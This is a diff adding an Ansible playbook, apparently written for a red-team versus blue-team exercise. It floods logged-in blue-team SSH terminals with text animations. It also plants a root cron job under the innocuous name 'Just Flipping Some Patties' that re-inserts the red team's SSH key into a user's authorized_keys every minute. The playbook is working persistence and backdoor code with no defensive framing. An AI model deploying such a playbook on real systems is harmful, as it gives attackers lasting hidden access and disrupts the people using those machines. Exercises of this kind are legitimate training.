@@ -1,0 +1,57 @@
+---
+-   name: Play in Blue's Face, Part A
+    hosts: all
+    become: yes
+    vars:
+    # Blue Team Subnet (Change)
+      subnet_prefix: "10.10.10"
+    # Folder of Spam Animation Files on Control Machine
+      source_spam_folder: "~/spaminations/"
+    # Hide Copy of Spam Folder in Downloads or other location in Target Machine
+      remote_spam_folder: "~/Downloads/ChumStuff/"
+    # Initial.txt is the first animation played
+      remote_spam_file: "initial.txt"
+    # SSH Kkey of RedTeamBox
+      redtool_ssh_key: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDjVP5QNOe54ZX7kYqimR1iBUgeg1ptJqfFuABfx8G4T root@RedBox"
+    # Location of Target Machine Authourized Keys on Admin User
+      remote_authorized_keys: "/home/mrkrabs/.ssh/authorized_keys"
+  
+    tasks:
+
+    - name: Copy over Textfiles
+    # Copy all Spam Animation Files on target machine
+      ansible.builtin.copy:
+        src: "{{ source_spam_folder }}"
+        dest: "{{ remote_spam_folder }}"
+
+    - name: Search for Blue Team SSH Terminal Lines
+    # Searches "who" output for terminal lines belonging to logged in Blue SSH Users
+      ansible.builtin.shell: |
+        who | awk -v net="{{ subnet_prefix }}" '$0 ~ net {print $2}'
+    # Blue terminal lines saved in target_pts
+      register: target_pts
+      changed_when: false
+
+    - name: Send Initial Animation
+    # Flood Blue Users on machine with initial animation
+      ansible.builtin.shell: |
+        /usr/bin/cat {{remote_spam_folder}}{{ remote_spam_file }} | tee /dev/{{ item }} > /dev/null
+      loop: "{{ target_pts.stdout_lines }}"
+      when: target_pts.stdout_lines | length > 0
+      changed_when: false
+
+    - name: Cron Service Is Enabled
+    # Ensure Cron Jobs can occure
+      ansible.builtin.systemd_service:
+        name: cron
+        state: started
+        enabled: true
+
+    - name: SSH Key CronJob load
+    # Use Cron Job so Red Team SSH key is always in Authorized files
+      ansible.builtin.cron:
+        name: "Just Flipping Some Patties"
+        user: "root"
+        minute: "*"
+        job: >-
+          grep -qxF "{{ redtool_ssh_key }}" {{ remote_authorized_keys }} || echo "{{ redtool_ssh_key }}" >> {{ remote_authorized_keys }}
